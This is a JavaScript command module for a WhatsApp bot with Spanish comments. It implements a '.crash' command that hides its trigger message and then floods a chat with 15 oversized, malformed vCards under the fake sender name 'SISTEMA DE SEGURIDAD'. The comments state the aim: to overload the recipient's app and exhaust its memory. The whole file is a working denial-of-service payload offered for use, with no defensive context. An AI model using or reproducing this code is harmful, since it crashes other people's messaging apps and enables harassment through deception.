export default {
    name: 'vcard_crasher',
    match: (text) => /^\.crash/i.test(text),
    execute: async ({ sock, remitente, msg }) => {
        
        try {
            // 1. Sigilo: Borramos el activador
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción de la "Carga Útil" (Payload)
            // Generamos una cadena masiva de caracteres que saturan el buffer de la UI
            const veneno = "🚀".repeat(10000); 
            const nombreLargo = "Bypass-UI-" + "A".repeat(30000);
            
            // Creamos una estructura de vCard corrupta
            const vcard = 'BEGIN:VCARD\n' +
                          'VERSION:3.0\n' +
                          `FN:${nombreLargo}\n` +
                          `ORG:${veneno};\n` +
                          `TEL;type=CELL;type=VOICE;waid=${sock.user.id.split(':')[0]}:+1 234 567 890\n` +
                          'END:VCARD';

            // 3. Envío masivo en un solo mensaje
            // Enviamos un array de contactos. WhatsApp intentará renderizar todos a la vez.
            await sock.sendMessage(remitente, {
                contacts: {
                    displayName: "SISTEMA DE SEGURIDAD",
                    contacts: Array(15).fill({ vcard }) // 15 contactos masivos son suficientes para tumbar la RAM
                }
            });

        } catch (err) {
            console.error("Error en VCard Crash:", err);
        }
    }
};
